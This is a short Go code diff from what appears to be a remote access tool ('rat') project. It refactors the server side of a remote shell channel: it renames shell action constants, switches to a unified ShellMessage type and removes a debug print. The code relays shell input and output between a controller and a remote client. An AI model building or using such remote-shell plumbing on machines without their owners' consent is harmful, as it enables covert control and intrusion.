@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"fmt"
 	"io"
 	"rat/shared"
 	"rat/shared/network/header"
@@ -30,9 +29,9 @@ func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
 
 				if msg, ok := m.(*ShellMessage); ok {
 					switch msg.Action {
-					case shared.WriteShell:
+					case shared.ShellWrite:
 						channel.Write([]byte(msg.Data))
-					case shared.StopShell:
+					case shared.ShellStop:
 						channel.Close()
 						return
 					}
@@ -52,10 +51,9 @@ func (data ShellChannel) Open(channel io.ReadWriteCloser, c *Client) error {
 			break
 		}
 
-		sendMessage(data.controller, c, ShellCommandMessage{string(b[:n])})
+		sendMessage(data.controller, c, ShellMessage{Action: shared.ShellWrite, Data: string(b[:n])})
 	}
 
-	fmt.Println("ending channel on command side")
 	channel.Close()
 
 	return nil
